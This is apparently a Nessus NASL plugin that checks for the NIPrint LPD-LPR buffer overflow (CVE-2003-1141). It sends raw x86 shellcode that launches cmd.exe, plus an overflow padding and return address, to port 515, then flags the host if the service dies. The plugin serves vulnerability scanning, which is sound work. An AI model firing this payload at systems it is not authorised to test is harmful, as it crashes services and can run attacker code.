if(description) 
{ 
	script_id(11926); 
	script_cve_id("CVE-2003-1141");
	script_bugtraq_id(8968);
	if (defined_func("script_xref")) {
	  script_xref(name:"OSVDB", value:"2774");
	}
      script_version("$Revision: 1.8 $"); 
        
      name["english"] = "NIPrint LPD-LPR Print Server"; 
      script_name(english:name["english"]); 

      desc["english"] = "A vulnerability in the NIPrint could allow an attacker to remotely 
overflow an internal buffer which could allow code execution. 

Solution: None, Contact the vendor http://www.networkinstruments.com/products/niprint.html
Risk factor : High"; 

	script_description(english:desc["english"]); 
      summary["english"] = "Checks for vulnerable NIPrint";
	script_summary(english:summary["english"]);
	script_category(ACT_DENIAL);
	script_copyright(english:"This script is Copyright (C) 2003 Matt North");
	family["english"] = "Denial of Service";
	script_family(english:family["english"]);

	exit(0);
}

port = 515;
if (! get_port_state(port)) exit(0);

r = raw_string( 0x90,0xCC,0x90,0x90,0x90,0x90,0x8B,0xEC,0x55,0x8B,0xEC,0x33,0xFF,0x57,0x83,0xEC,0x04,0xC6,0x45,0xF8,0x63
,0xC6, 0x45, 0xF9, 0x6D,0xC6,0x45,0xFA,0x64,0xC6,0x45,0xFB,0x2E,0xC6,0x45,0xFC,0x65,0xC6,0x45,0xFD,0x78,
0xC6,0x45,0xFE,0x65,0xB8,0xC3,0xAF,0x01,0x78,0x50,0x8D,0x45,0xF8,0x50,0xFF,0x55,0xF4,0x5F);

r1 = raw_string( 0xCC, 0x83,0xC4,0x04, 0xFF,0xE4);
r2 = string(crap(43));
r3 = raw_string( 0xcb, 0x50, 0xf9, 0x77);
bo = r + r1 + r2 + r3;

soc = open_priv_sock_tcp(dport: port);
if(!soc) exit(0);

send(socket:soc,data:bo);

close(soc);
alive = open_priv_sock_tcp(dport: port);
if (!alive) security_hole(port);

